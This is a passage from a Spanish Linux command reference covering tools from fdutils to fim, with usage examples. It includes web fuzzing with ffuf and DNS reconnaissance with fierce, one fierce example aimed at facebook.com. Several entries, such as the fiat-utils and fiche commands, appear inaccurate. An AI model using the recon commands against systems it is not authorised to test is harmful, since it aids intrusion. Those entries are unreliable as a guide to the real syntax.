utilidades para formatear discos de capacidad extra, montar y desmontar automáticamente disquetes, etc. Incluye las aplicaciones diskd [daemon que espera a que se inserte el disco], diskseekd [demonio de búsqueda de disco], fdlist [enumerar unidades conocidas], fdmount [monta y desmonta automáticamente los discos al insertarlos o extraerlos], fdmountd [daemon de montaje de disquetes], fdrawcmd [envía comandos sin formato al controlador de disquete], fdumount [Utilidad de montaje de disquetes], floppycontrol [configura el controlador de disquete], floppymeter [Mida la capacidad bruta y la velocidad de rotación exacta de la unidad de disquete], getfdprm [imprime la geometría actual del disco], setfdprm [establece la geometría actual del disco], superformat [formatea discos de alta capacidad hasta 1992 kb para discos de alta densidad o hasta 3984 kb para discos de densidad extra], xdfcopy [formatea, lee y escribe en los discos XDF de OS/2], xdfformat [Copiar y formatear discos XDF], MAKEFLOPPIES [crea los dispositivos de disquete en /dev] y fdutilsconfig [configurar el bit suid de fdmount].
Nota.- Las utilidades no funcionan con unidades de disquete USB, ya que no permiten el acceso directo al controlador de disquete.


feed2exec
Herramienta que permite automatizar acciones basadas en feeds RSS o Atom. Básicamente, monitorea feeds y ejecuta acciones cuando encuentra nuevos elementos.
$ feed2exec add "Noticias Linux" https://example.com/feed.xml maildir (la primera entrada crea la configuración y descarga el feed indicado y lo guarda en un Maildir)
$ feed2exec fetch (actualización de feeds)
$ feed2exec add "Noticias Tecnología" https://ejemplo.com/rss maildir --mailbox ~/Mail/tech-news/ (enviar artículos a un buzón Maildir específico)
$ feed2exec add "Podcasts" https://ejemplo/feed.xml exec --command "wget {url} -O ~/Podcasts/{author}-{title}.mp3" (cuando aparece una nueva entrada en el feed mencionado, se descarga automáticamente con wget)
$ feed2exec add "Blog Linux" https://ejemplo/feed.xml maildir --filter "machine learning|inteligencia artificial" (solo los artículos que contengan "machine learning" o "inteligencia artificial" serán procesados)
1.-
Ejemplo de configuración mediante archivo YAML
$ nano ~/.config/feed2exec.ini
       [DEFAULT]
        output = maildir
        mailbox = ~/Mail/feeds/
       [feeds.noticias]
        url = https://example.com/feed.xml
        output = maildir
        mailbox = ~/Mail/noticias/
       [feeds.podcasts]
        url = https://podcast-feed.com/feed.xml
        output = exec
        command = wget {url} -O ~/Podcasts/{title}.mp3
       ...
2.-
Configurar un trabajo cron para que feed2exec se ejecute periódicamente
$ crontab -e
Añadir una línea para ejecutar feed2exec cada hora
       0 * * * * /usr/bin/feed2exec fetch


feedbackd
Demonio activado por DBus que proporciona retroalimentación táctil, visual y auditiva basada en eventos. Incluye fbd-theme-validate
$ fbcli -t=5 -P=full -w 5
$ fbcli -t 0 -E phone-incoming-call (Ejecutar retroalimentaciones para el evento phone-incoming-call hasta que se detenga explícitamente)
$ fbcli -t -1 -E message-new-instant (Ejecutar para el evento message-new-instant solo una vez)
$ fbcli -t 10 -E alarm-clock-elapsed (Ejecutar para el evento message-new-instant durante 10 segundos)


feh
Visor de imagenes liviano.
$ feh /home/usuario/imagenes (Muestra las imagenes del directorio)
$ feh -g 800x600 -S filename -D 1.5 /home/usuario/imagenes (Que las muestre a 800x600 pixels conservando proporciones, alfabéticamente [-s filename] y con intervalos de 1,5 segundos)
$ feh -w /home/usuario/imagenes (Las abre todas en ventanas distintas)
$ feh -i -r -e .fonts/Annabel.ttf/10 -O index.jpg /home/usuario/imagenes (Crea una imagen con los thumbnails de las imagenes del directorio y los subdirectorios [-r] con nombre [-O index.jpg] y colocando el nombre de la imagen con la fuente Annabel a 10 puntos. Ha de especificarse la ruta a la fuente)
$ feh -m /home/usuario/imagenes (Crea una imagen con todas las imágenes del directorio especificado como con -i pero sin poner el nombre)
$ feh -kR 10 http://192.168.1.9/img/video.asf (Grabar un video de 10 segundos de una cámara ip en el presente directorio)
$ feh --bg-scale /home/usuario/imagenes/image.jpg (Colocar una imagen de fondo de pantalla de forma escalada [bg-tile: mosaico, bg-center: centrado, bg-fill: escalado proporcional y bg-max: escalado y proporcional con razón de aspecto)
$ feh http://URL/imagen.png (Visualizar una imagen a partir de una URL)


fenrir
Lector de pantalla diseñado para usuarios con discapacidades visuales. Su objetivo es proporcionar acceso a la información en la pantalla a través de síntesis de voz y braille. Incluye fenrir-daemon.
$ fenrir (iniciará el daemon de Fenrir y comenzará a leer la salida de la terminal)


ferm
Cortafuegos que en realidad tiene debajo a iptables . El archivo de configuración se crea en /etc/ferm/ferm.conf y las reglas personales se pueden organizar en /etc/ferm/ferm.d/local.conf.
# import-ferm > /etc/ferm/ferm.d/personal.conf (importar reglas de iptables)
# import-ferm /etc/iptables/rules.v4 > /etc/ferm/ferm.d/personal.conf (importar reglas de iptables-persistent)
# ferm -i  -t 10 /etc/ferm/ferm.conf (cargar la aplicación en 10 segundos [predeterminado 30 segundos])
# ferm -nl /etc/ferm/ferm.d/personal.conf (ver las reglas importadas de iptables)
# ferm --flush /etc/ferm/ferm.conf (eliminar todas las reglas)
Ejemplo de archivo de configuración. Con iptables sería de la siguiente forma:
        iptables -A INPUT -p tcp -j ACCEPT
        iptables -A OUTPUT -p tcp -j ACCEPT
        iptables -A INPUT -p udp -j ACCEPT
        iptables -A OUTPUT -p udp -j ACCEPT
Con Ferm:
    domain ip {
           table filter {
           chain (INPUT OUTPUT) {
           proto (udp tcp) ACCEPT;}
           }
    }


fernapp
[openjdk-6-jre unzip xvfb libxcomposite1 libxdamage1 x11-xkb-utils]. Acceso a aplicaciones gráficas desde el navegador. Descarga: https://bitbucket.org/MarkusKramer/fernapp/downloads/ una vez descomprimido el paquete:
$ cd fernapp
$ sudo chmod +x fernapp-server.sh
$ ./fernapp-server.sh libreoffice (indicar la aplicacion que quiere compartirse)
En el navegador remoto se accede por: http://localhost:8080/index.html y la contraseña 123


festival
[festival festvox-ellpc11k]. Sintetizador de voz.
$ echo “Linux es genial” | festival --tts --language spanish
$ festival --tts --language spanish archivo.txt
Nota.- Si al lanzar la aplicación nos muestra una salida: “Linux: can't open /dev/dsp”, crear el fichero .festivalrc en nuestra $HOME pegando el siguiente contenido:
	(Parameter.set 'Audio_Command "aplay -q -c 1 -t raw -f s16 -r $SR $FILE")
	(Parameter.set 'Audio_Method 'Audio_Command)


fetch
[procps imagemagick w3m-img wmctrl feh mpc scrot x11-utils]. Mostrar información del sistema. Descarga e instalación:
	$ git clone https://github.com/dylanaraps/fetch
	$ cd fetch
	$ sudo make install
$ fetch --ascii


fetch-crl
Descargas de Listas de Revocación de Certificados. Esta herramienta y la entrada asociada del temporizador (systemd) o cron (init.d) garantizan la recuperación periódica de las Listas de Revocación de Certificados [Certificate Revocation Lists - CRL] de los sitios web de las respectivas Autoridades de Certificación [CA]. Las CRLs son listas que contienen certificados que han sido revocados por la CA y que ya no son considerados válidos y el propósito principal de la aaplicación es asegurar que el sistema tenga acceso a información actualizada sobre estos certificados revocados.
# ls -lh /etc/grid-security/certificates/ (ver si existen certificados en el sistema)
# fetch-crl (actualizar los archivos de CRL en el sistema)
1.-
Agregar una entrada en el cron para ejecutarlo cada 12 horas:
        0 */12 * * * root /usr/sbin/fetch-crl > /var/log/fetch-crl.log 2>&1


fex
[Fast File EXchange de Frams]. Servicio que permite intercambiar archivos muy grandes de forma rápida y cómoda. El remitente carga el archivo en el servidor FEX y el destinatario recibe automáticamente un correo electrónico de notificación con una URL de descarga.


ffcvt
Herramienta de conversión de ffmpeg que simplifica la codificación de compresión de audio/vídeo de alta eficiencia [Opus/H.265].
$ ffcvt video.mp4 (generará un archivo video_.mkv [el guión bajo se añade por defecto al nombre])
Su equivalente en ffmpeg:
         $ ffmpeg -i video.mp4 -c:v libx265 -x265-params crf=28 -c:a libopus -b:a 64k video_.mkv
$ ffcvt -t webm video.mp4 (convierte video.mp4 a video_.webm usando VP9 para video y Opus para audio, ideal para la web)
Su equivalente en ffmpeg:
         $ ffmpeg -i video.mp4 -c:v libvpx-vp9 -c:a libopus -b:a 64k video_.webm
$ ffcvt -abr 128k video.mp4 (el audio se codificará a 128k con Opus)
Su equivalente en ffmpeg:
         $ ffmpeg -i video.mp4 -c:v libx265 -x265-params crf=28 -c:a libopus -b:a 128k video_.mkv
$ ffcvt -C 00:00:10-00:00:20 video.mp4 (cortar un segmento del video, por ejemplo, de 00:00:10 a 00:00:20)
Su equivalente en ffmpeg:
         $ ffmpeg -i video.mp4 -ss 00:00:10 -t 00:00:10 -c:v libx265 -x265-params crf=28 -c:a libopus -b:a 64k video_.mkv
$ ffcvt -Speed 1.5 video.mp4 (acelerar el video a 1,5 veces)
Su equivalente en ffmpeg:
         $ ffmpeg -i video.mp4 -filter:v "setpts=0.666667*PTS" -c:v libx265 -x265-params crf=28 -c:a libopus -b:a 64k video_.mkv
$ ffcvt -o "-vf scale=1280:720" video.mp4 (pasa opciones adicionales directamente a ffmpeg pòr ejemplo redimensiona a 720p).


ffe
Herramienta para analizar archivos planos y CSV [Comma-Separated Values] y convertirlos a diferentes formatos.
$ ffe -i archivo.csv -o archivo.json (convertir un .csv en un .json)
$ ffe -i archivo.csv -o archivo.tsv --delimiter "\t" (convertir un .csv a .tsv [Tab-Separated Values], epecificando el delimitador de tabulación)
$ ffe -i archivo.csv -o archivo_filtrado.csv --filter "edad > 30" (filtrar datos si solo se quiere las filas donde la columna "edad" es mayor a 30)
$ ffe -i archivo.csv -o columnas_extraidas.csv --columns "nombre,edad" (extraer algunas columnas del .csv)


fff
[Fucking Fast File-manager]. Gestor de archivos escrito en Bash que permite explorar archivos y gestionarlos de manera rápida desde la línea de comandos.
Descarga e instalación:
	$ curl https://raw.githubusercontent.com/dylanaraps/fff/master/fff > fff
	$ chmod +x fff
	# mv fff /usr/bin
$ fff
Teclas para la gestión:
	j (bajar cursor)
	k (subir cursor)
	h (carpeta precedente)
	l (entrar en subcarpeta
	enter (entrar en subcarpeta)
	g (ir al inicio)
	G (ir al final)
	. (ver/ocultar archivos ocultos)
	/ (buscar)
	t (ir a la papelera)
	~ (ir al directorio home)
	[1-9] (favoritos)
	↓ (bajar cursor)
	↑ (subir cursor)
	← (ir a la carpeta precedente)
	→ (entrar en subcarpeta)
	f (nuevo archivo)
	n (nueva carpeta)
	y (marcar para copiar)
	m (marcar para mover)
	p (pegar/mover)
	r (renombrar)
	d (borrar [~/.cache/fff/trash/])
	q (salir)


ffindex
Conjunto de herramientas diseñado para manejar grandes cantidades de archivos pequeños almacenándolos de manera eficiente en una base de datos indexada. Esto es útil para aplicaciones bioinformáticas, como bases de datos de secuencias o estructuras de proteínas. Incluye las herramientas ffindex_apply, ffindex_apply_mpi, ffindex_build, ffindex_from_fasta, ffindex_from_tsv, ffindex_get, ffindex_modify y ffindex_unpack.
$ ffindex_from_fasta sequences.ff{data,index} < sequences.fasta (construir una base de datos desde un archivo FASTA que permitiría acceder a cada secuencia individualmente mediante ffindex_apply)
$ ffindex_from_tsv sequences.ff{data,index} < data.tsv (construir una base de datos a partir de un archivo TSV [tab-separated values])
$ ffindex_apply sequences.ff{data,index} grep "ATG" (buscar "ATG" en cada secuencia almacenada)
1.-
Crear una base de datos ffindex a partir de archivos individuales.
$ ls secuences/
seq1.fasta  seq2.fasta  seq3.fasta
$ ffindex_build sequences.ff{data,index} sequences/* (construir la base de datos generando sequences.ffdata con las secuencias concatenadas y sequences.ffindex con el índice de cada archivo)


ffmpeg
Conversor de archivos de audio y video. La aplicación contiene otros ejecutables: ffplay, ffprobe y qt-faststart
$ ffmpeg -i archivo.mpg  (Obtener información de un archivo)
$ ffmpeg -i archivo1.avi archivo2.mpg  (Convertir de un formato a otro)
$ ffmpeg -i archivo1.3gp -vcodec mpeg4 -acodec mp3 archivo2.avi (Convertir videos en formato 3gp del móvil a avi)
$ ffmpeg -i archivo1.avi archivo2.mpg -s 640×480 -b 800 (Cambiar formato especificando bitrate y resolución del archivo de salida)
$ ffmpeg -i archivo.avi -vn -acodec copy audio.mp3 (Extraer el audio de un archivo de video)
$ ffmpeg -i input.flac -ab 196k -ac 2 -ar 48000 output.mp3 (De flac a mp3)
$ ffmpeg -i archivo.avi -an -vcodec copy video.avi  (Extraer el video de un archivo sin el audio)
$ ffmpeg -i movie.avi -acodec mp3 -ar 11025 movie.flv  (de avi a flv)
$ ffmpeg -i music.mp3 -acodec amr_nb -ar 8000 -ac 1 -ab 32 music.amr (de mp3 a amr)
$ ffmpeg -i video.mpg -f mp3 audio_track.mp3 (de mpeg a mp)
$ ffmpeg -i myfile.avi -target pal-vcd myfile_vcd.mpg (de avi a vcd)
$ ffmpeg -i music.wav -acodec amr_nb -ar 8000 -ac 1 -ab 32 music.amr (de wav a amr)
$ ffmpeg -i video_1 -t 9 video_2 (video_2 tendrá los 9 primeros segundos de video_1)
$ ffmpeg -i video_1 -ss 9 -t 15 video_2 (video_2 empezarà en el minuto 9 de video_1 y durará 15 segundos a partir de este punto)
$ ffmpeg -i archivo.mpeg -s qcif -r 12 -ac 1 -ar 8000 -b 30 -ab 12 salida.3gp (de mpeg a 3gp)
$ ffmpeg -i pelicula.mpg -acodec mp3 -vcodec xvid -b 687 pelicula.avi (de mpeg a Xcid)
$ ffmpeg -i pelicula.mpg -vcodec flv -y pelicula.flv (de mpeg a flv)
$ ffmpeg -f image2 -i imagenes%d.jpg video.mpeg  (Convertir una secuencia de imagenes a video)
$ ffmpeg -i video -sameq -r 1 %d.png (sacar un fotograma png cada segundo de un video)
$ ffmpeg -i video.avi video.mpg -s 640×480 -b 800  (convertir de avi mpg especificando resolución y bitrate)
$ ffmpeg -i video.mpeg -pix_fmt rgb24 imagenes.gif (Convertir imagenes de un video a .gif animado)
$ ffmpeg -i nuevo_video.mpeg -sameq nuevo_video.avi (de mpeg a avi)
$ ffmpeg -i video.avi -an video_sin_sonido.avi (Suprimir el audio de un video)
$ ffmpeg -i video.avi audio.mp3 (Separar para guardar el sonido de un video)
$ ffmpeg -i audio.mp3 -i montaje.avi video_final.avi (Añadir sonido a un video sin él)
Nota.- Si el audio.mp3 es más largo que el montaje.avi el resultado final tendrá la duración del audio y viceversa.
$ ffmpeg -f alsa -ac 2 -i hw:0,0 -f x11grab -r 30 -s $(xwininfo -root | grep 'geometry' | awk '{print $2;}') -i :0.0 -acodec pcm_s16le -vcodec libx264 -vpre lossless_ultrafast -threads 0 -y output.mkv  (crear un video del escritorio)
$ ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 video.mpg (lo mismo. Alguien ha de estar visualizando la sesión)
$ ffmpeg -f x11grab -s 1280x1024 -r 25 -i :0.0 -sameq /home/usuario/video.mpg (Grabar escritorio)
$ ffmpeg -loop_input -i imagen.png -vframes 500 -an video.avi (Crear video.avi de 500 segundos mostrando una imagen)
$ ffmpeg -itsoffset -4 -i video.avi -vcodec mjpeg -vframes 1 -an -f rawvideo -s 320x240 test.jpg (Sacar un tumbnail de un video)
$ ffmpeg -ss 5 -i video.mpegi -vframes 1 -s 320x240 thumb.jpg (lo mismo)
$ ffmpeg -i http://192.168.1.115/img/video.asf -vcodec copy -b 900k salida.asf (Grabar un video de una ubicación en la red [cámara ip])
$ ffmpeg -i ./PELICULA_ENTRADA.MOV -s 800x450 -vcodec libxvid -acodec aac -strict experimental -ac 2 -r 25 -ab 44100 -b 500k -aspect 16:9 fichero_salida.mp4 (Convertir un vídeo a un formato reconocido por Android)
1. Unir varios videos
$ ffmpeg -i video1.avi -sameq video1.mpeg (Primero convertirlos a mpeg))
$ ffmpeg -i video2.avi -sameq video2.mpeg
$ cat video1.mpeg video2.mpeg > nuevo_video.mpeg (Unir los videos resultantes usando cat)


ffmpegfs
Es un sistema de archivos virtual de solo lectura basado en FUSE [Filesystem in Userspace], similar a mp3fs [ver], pero mucho más versátil. Utiliza la biblioteca FFmpeg para transcodificar archivos de audio y video de múltiples formatos de entrada, como AVI, OGG, MOV, MKV, AVI, MP4, FLAC, WAV, etc. a formatos de salida como MP4, WebM, OGG, MP3, OPUS, MOV, ProRes, WAV, FLAC, TS, HLS en tiempo real, cuando se abren o leen los archivos en el montaje. Esto significa que no genera archivos físicos permanentes; en su lugar, crea el contenido transcodificado "sobre la marcha" de forma dinámica.
Permitir montajes como usuario normal:
# nano /etc/fuse.conf
Descomentar la linea:
	 user_allow_other
$ ffmpegfs --desttype=webm ~/Videos /tmp/webm -o allow_other,ro (montar un directorio)
Una vez montado, navega el punto_de_montaje como un directorio normal. Los archivos se renombran automáticamente con la extensión del formato de salida por ejemplo un MKV se ve como .mp4 y se transcodifican al leerlos por ejemplo con VLC o al copiar).
$ fusermount -u /tmp/webm (desmontar)
$ $ ffmpegfs --desttype=mp3 --audiobitrate=256K /home/usuario/Musica /mnt/mp3 -o allow_other,ro --cachepath=/tmp/ffmpeg_cache (transcodificación de audio a MP3 con bitrate específico)
$ ffmpegfs --desttype=mp4 --videobitrate=1.5M --audiobitrate=256K /mnt/multimedia /mnt/stream -o allow_other,ro --log_maxlevel=INFO (montaje mixto para audio/video con bitrates personalizados)
$ ffmpegfs --desttype=hls --videobitrate=1.5M --audiobitrate=256K /mnt/multimedia /mnt/stream -o allow_other,ro --log_maxlevel=INFO (montaje mixto para audio/video con bitrates personalizados y HLS para streaming)
--desttype=FORMATO --> Formato de salida [mp4, webm, mp3, ogg, hls]. Por defecto: mp4.
--audiobitrate=BPS --> Bitrate de audio [256K para 256 kbps].
--videobitrate=BPS --> Bitrate de video [1.5M para 1.5 Mbps].
-o allow_other,ro --> Permite acceso a otros usuarios y modo solo lectura.
--log_maxlevel=DEBUG --> Para depuración [ERROR, INFO, DEBUG].


ffmpegthumbnailer
Crear miniaturas de los archivos de vídeo.
$ ffmpegthumbnailer -c png -q 10 -i input.mp4 -o output.png (en formato png, máxima cualidad, 0 la mínima, archivo de entrada y salida)


ffmpegthumbs
Generador de miniaturas de vídeo que utiliza FFmpeg para crear imágenes representativas de los archivos de video.
$ ffmpegthumbs input.mp4 output.jpg (genera una imagen JPEG representativa del video input.mp4 y la guarda como output.jpg)
$ ffmpegthumbs -s 320x240 input.mp4 output_320x240.jpg (generar miniaturas en diferentes tamaños)
$ ffmpegthumbs -n 5 input.mp4 output_%d.jpg (generará 5 miniaturas numeradas del 0 al 4)


ffmsindex
Herramienta para crear archivos de índice de ffms2 [FFMpegSource2] para ffmpeg con contenido adicional para aplicaciones que ffmpeg no gestiona correctamente. Su función principal es generar archivos de índice [.ffindex] que facilitan el acceso a los videos en aplicaciones que requieren una indexación previa para manejar correctamente el contenido, especialmente en formatos problemáticos para ffmpeg.
$ ffmsindex video.mp4 (creará video.ffindex en el mismo directorio)
$ ffmsindex video.mp4 indice_custom.ffindex (creará indice_custom.ffindex en lugar del predeterminado)
$ ffmsindex -f video.mp4 (forzar la reindexación)
$ ffmsindex -t 0 video.mp4 (indexar solo el primer flujo de video: 0)
$ ffmsindex -t 2 video.mp4 (indexar solo el segundo flujo de audio: 2)
$ ffmsindex -v video.mp4 (imprimirá información sobre los diferentes flujos de video y audio detectados)


ffuf
[Fuzz Faster U Fool]. Herramienta escrita en Go diseñada para realizar fuzzing en aplicaciones web, descubriendo directorios, subdominios, parámetros y más. Es muy utilizada en pruebas de seguridad para encontrar archivos ocultos, rutas sensibles y posibles vulnerabilidades. Fuzzer es una técnica automatizada de pruebas de software que consiste en proporcionar datos inválidos, inesperados o aleatorios como entrada a un programa informático.
Con un archivo como:
$ nano wordlist.txt
       id
       user
       admin
       debug
$ ffuf -u "http://ejemplo.com/index.php?FUZZ=valor" -w params.txt
El escaneo probará http://ejemplo.com/index.php?id=valor, ?user=valor, etc., buscando respuestas distintas y el reultado puede ser:
       user                    [Status: 301, Size: 230, Words: 9, Lines: 7]
       debug                   [Status: 301, Size: 231, Words: 9, Lines: 7]
       id                      [Status: 301, Size: 228, Words: 9, Lines: 7]
       admin                   [Status: 301, Size: 231, Words: 9, Lines: 7]
$ ffuf -u "http://ejemplo.com/login" -X POST -d "FUZZ=admin" -w wordlist.txt (descubrir nombres de parámetros en formularios o APIs. wordlist.txt puede sontener nombres tipo: username, user, login...)
$ ffuf -u http://FUZZ.ejemplo.com -w subdominios.txt -H "Host: FUZZ.ejemplo.com" (encontrar subdominios ocultos mediante virtual hosts. subdominios.txt puede sontener: dev, test, api,admin...)
$ ffuf -u http://ejemplo.com/FUZZ -w wordlist.txt -fc 403,404 (ignorar respuestas con código 403 o 404)
$ ffuf -u http://ejemplo.com/FUZZ -w wordlist.txt -fs 0 (filtrar por tamaño de respuesta [0 bytes])
$ ffuf -u http://ejemplo.com/FUZZ -w wordlist.txt -t 100 -rate 50 (establecer 100 hilos concurrentes y limitar a 50 solicitudes por segundo)


fg
Pasa un proceso a primer plano.
$ fg PID
$ fg %2 (Regresa a foreground el proceso num2)


fgallery
Generador de galerías de fotos estáticas escrito en C que produce galerías web ligeras y rápidas sin necesidad de bases de datos o lenguajes de servidor.
$ fgallery fotos/ galeria/ (creará una galería en el directorio galeria/ con las imágenes de fotos/)
$ fgallery -q 85 -s 800x600 fotos/ galeria/ (especificar calidad JPEG al 85% y tamaño máximo de imágenes 800x600 píxeles)
$ fgallery -t 150x150 fotos/ galeria/ (galería con miniaturas personalizadas)
$ fgallery -r vacaciones/ galeria/ (incluir subdirectorios recursivamente)
$ fgallery -i -c 3 -p -b "#333333" fotos/ galeria/ (mostrar nombres de archivo, 3 columnas de miniaturas, mostrar información EXIF y color de fondo gris oscuro)
Nota.- El directorio de salida contendra: index.html, thumbs/, images, css y jss


fgconsole
Muestra el número de terminal activo.
$ fgconsole


fgetty
[Fast Getty]. Getty minimalista, eficiente, con un consumo de memoria mínimo, que no soporta terminales seriales ni redes y solo apto para consola de Linux. fgetty incluye un programa de inicio de sesión compatible con la interfaz de autenticación checkpassword [usada en sistemas tipo DJB [Daniel J. Bernstein] como qmail, ucspi-tcp, etc.] y también un programa checkpassword que utiliza la interfaz de la biblioteca estándar de C para passwd y shadow.
$ fgetty /dev/tty1 (iniciar fgetty en la consola virtual mencionada y mostrará el prompt de login en esa terminal)
$ fgetty --login /usr/bin/checkpassword /dev/tty2 (indica que debe usar checkpassword como backend de autenticación)
$ fgetty -n /dev/tty1 (sin prompt personalizado)
$ fgetty --noclear /dev/tty1 (sin limpiar pantalla, más rápido)


fgrep
(fast grep). Busca cadenas de texto fijas. Ignora el significado especial de los metacaracteres.


fh2odg
Utilidad para convertir documentos de Freehand [un programa de diseño gráfico vectorial] a documentos de dibujo de OpenDocument [ODG] utilizado por aplicaciones como LibreOffice Draw y OpenOffice Draw.
$ fh2odg mi_dibujo.fh (generará un archivo llamado mi_dibujo.odg en el mismo directorio)
$ fh2odg mi_dibujo.fh -o mi_dibujo_convertido.odg (especificar un nombre para el archivo de salida)


fhist
Utilidades para ver los cambios que se han realizado en un archivo. incluye las utilidades fcomp [comparación de archivos] y fmerge [fusión de archivos]
$ fhist documento.txt (ver el historial de cambios)
$ fcomp documento_v1.txt documento_v2.txt (mostraría las diferencias línea por línea, indicando qué partes se han añadido, eliminado o modificado entre las dos versiones)
$ fmerge documento_v1.txt documento_v2.txt > documento_fusionado.txt (combinaría los cambios de ambos archivos y guardaría el resultado en documento_fusionado.txt)


fiat-utils
Colección de bibliotecas de utilidades Fortran seleccionadas, extraídas del modelo IFS/Arpege [Integrated Forecasting System/Action de Recherche Petite Echelle Grande Echelle] utilizado en el ECMWF [European Centre for Medium-Range Weather Forecasts - Centro Europeo de Pronósticos Meteorológicos a Medio Plazo]. Estas herramientas son útiles para el análisis y manipulación de datos numéricos, especialmente en el contexto de modelos meteorológicos y climáticos. Proporciona: drhook [depurar programas Fortran], gstats [sincronización], parkind [selección de precisión], mpl [comunicación MPI] y mpi_serial [símbolos ficticios MPI compilados en una biblioteca estática y otras rutinas]
$ drhook -i input.f90 -o output.f90 ( inserta puntos de control [hooks] en el archivo input.f90 y guarda el resultado en output.f90. Luego, se compila y ejecuta output.f90)
$ gstats -f archivo_de_datos.grb -v temperatura (calcula las estadísticas de la variable “temperatura” en el archivo archivo_de_datos.grb)
$ parkind -double input.f90 -o output.f90 (convierte las variables reales y complejas en input.f90 a doble precisión y guarda el resultado en output.f90)
$ mpl -i archivo_de_datos.dat -v variable -o grafico.png (visualizar datos numéricos de modelos meteorológicos y climáticos. Genera un gráfico de la variable “variable” del archivo archivo_de_datos.dat y lo guarda como grafico.png)
$ mpi_serial ./mi_programa_mpi (ejecuta el programa MPI mi_programa_mpi en modo serial)


fiche
Receptor para la salida de línea de comandos de Pastebin. Se usa normalmente en combinación con un servidor web.
$ echo "Hola mundo" | fiche (enviará el texto "Hola mundo" a Pastebin)
$ ls -l | fiche (listará los archivos y directorios en el actual y los enviará a Pastebin)
$ fiche --web-server /path/to/webserver (recibir notificaciones cuando haya nuevos pastes)
$ echo "Mi código fuente" | fiche --api-key MY_API_KEY --paste-name "mi_codigo" (usar una API key personalizada de Pastebin y nombra el paste automáticamente)


fierce
Herramienta de reconocimiento de DNS [Domain Name System] que se utiliza para descubrir posibles nombres de host y direcciones IP asociadas a un dominio. y para identificar subdominios y rangos de IP que podrían no ser evidentes en un escaneo superficial. A diferencia de herramientas agresivas como dnsrecon o nmap, fierce opera de manera más sigilosa, lo que lo hace menos intrusivo.
$ fierce --tcp --domain dominio.com --dns-servers 8.8.8.8 --range 192.168.1.0/24 (usar tcp, lista subdominios, usando los DNS de google y en el rango especificado)
$ fierce --domain dominio.com --subdomains accounts admin ads (buscar los subdominios especificados)
$ fierce --domain facebook.com --subdomains admin --search fb.com fb.net
$ fierce --domain ejemplo.com --delay 1000 (con un retraso de 1 segundo [1000 ms] entre consultas para ser menos ruidoso)


figlet
Baners
$ figlet texto (forma básica)
$ showfigfonts    (visualizar las tipografias del comando)
$ figlet -f banner texto  (especificando tipografía)
Opciones
	-c (centra el texto de salida)
	-l (alinea el texto a la izquierda)
	-r (alinea el texto a la derecha)
	-w (establece un tamaño máximo)
	-t (Con la anchura máxima que permite la terminal)


figlist
Lista las fuentes disponibles en figlet.
# figlist
# figlist -d /usr/share/figlet


file
Indica el tipo y codificación de un fichero.
$ file script.sh
$ file Desktop
$ file archivo.odt
$ file -i archivo
$ file --mime-encoding archivo.txt (Mostrar codificación)


file2brl
Convierta un archivo xml, html o de texto en un archivo braille.
$ file2brl texto.txt text-braile.txt


filefrag
Visualizar la fragmentación de un fichero [ext2,3 y 4].
# filefrag -v fichero (Con resultado “1 extent found” no está fragmentado, en caso contrario, si)


fileschanged
Utilidad que informa cuando los archivos han sido alterados. Cuando descubre que un archivo ha sido alterado, muestra el nombre del archivo en la salida estándar.
$ fileschanged -r ~/ (controla el directorio home del usuario de forma recursiva)
$ fileschanged /var/log/messages


filespooler
Herramienta que facilita la ejecución de comandos tanto de manera local como remota, capturando su salida estándar [stdout] y facilitando la integración con otras herramientas.
$ filespooler ls -l (ejecutar un comando localmente, como ls -l, y capturar su salida)
$ filespooler -H usuario@servidor uptime (ejecutará el comando uptime en el servidor remoto y capturará su salida en la terminal local)


filetea
Sistema web para compartir archivos que funciona como un servidor web. Al arrastrar archivos al navegador, se generará una URL para cada uno. Estas URL se pueden enviar a otras personas, que podrán descargar los archivos con curl o wget. El archivo de configuración en /etc/filetea/filetea.conf
# filetea (abre en el navegador la dirección por defecto localhost:8080 donde ha de arrastrase los archivos)
# filetea -p 4430 (abre el servidor en el puerto especificado)
# filetea -D (iniciar el servidor en background)


filetraq
Script de shell que informa sobre alguna modificación en algún archivo que se ha producido. Está diseñado para ejecutarse como un trabajo cron, además mantiene una copia de seguridad con fecha del original.
# filetraq


filtergen
Generador de filtros de paquetes para diversos sistemas de firewall facilitando la configuración de diferentes sistemas de firewall como iptables, ipchains y ipfw.
Ejemplo de un archivo de configuración:
# nano firewall.fg
       policy reject
       #
       # Permitir tráfico entrante SSH (puerto 22)
       accept in on eth0 proto tcp dport 22
       #
       # Permitir tráfico saliente para conexiones establecidas
       accept out on eth0 mod state state established,related
       #
       # Bloquear todo el tráfico de una IP específica
       deny in on eth0 from 192.168.1.100
$ filtergen -o reglas_iptables.sh firewall.fg (generará un script llamado reglas_iptables.sh con las reglas de iptables correspondientes)
$ bash reglas_iptables.sh (aplicar las reglas generadas)
$ filtergen -f firewall.fg | bash (generar reglas directamente y aplicarlas sin un archivo intermedio)
$ filtergen -F ipchains -o reglas_ipchains.sh firewall.fg (generar reglas para ipchains)


filters
Colección de filtros para hacer todo tipo de cosas extrañas a un texto en inglés. Opciones: (LOLCAT, b1ff, censor, chef, cockney, eleet, fanboy, fudd, jethro, jibberish, jive, ken, kenny, kraut, ky00te, nethackify, newspeak, nyc, pirate, rasterman, scottish, scramble, spammer, studly, uniencode y upside-down)
$ echo "make tech easier is cool" | pirate
$ echo "make tech easier is cool" | ky00te
$ echo "make tech easier is cool" | kraut
$ echo "make tech easier is cool" | kenny


filtlong
Herramienta de filtrado de lecturas de secuencia genómica largas [LGS] que se utiliza comúnmente en análisis de secuencias de ADN.
$ filtlong -l 500 input.fasta > filtered_output.fasta (filtrando secuencias con longitud mínima de 500 bp)
$ filtlong -m 3 input.fasta > filtered_output.fasta (filtrando secuencias con un máximo de 3 bases repetidas consecutivamente)
$ filtlong -p 0.05 input.fasta > filtered_output.fasta (filtrando secuencias cuyas bes repetidas no excedan el 5% del total)
$ filtlong -q 20 input.fasta > filtered_output.fasta (filtrando secuencias con calidad promedio superior a 20)
$ filtlong -l 500 -m 3 -p 0.05 -q 20 input.fasta > filtered_output.fasta (combinando múltiples criterios)


fim
Herramienta que utiliza el framebuffer del sistema para mostrar imágenes directamente desde la línea de comandos.
$ fim imagen.jpg (uso básico)
$ fim -a *.jpg (abrir todas las imagenes jpg del directorio actual con zoom automático)
$ fim -R Imagenes/ --sort (Para abrir las imagenes de la carpeta y subcarpetas recursivamente y despues ordenarlas)
$ fim -t imagen.jpg (randerizar una imagen en formato ASCII)
Atajos de teclado
    AvPág/AvPág		Prev/Imagen siguiente.
    +/-			Acercar/Alejar la imagen.
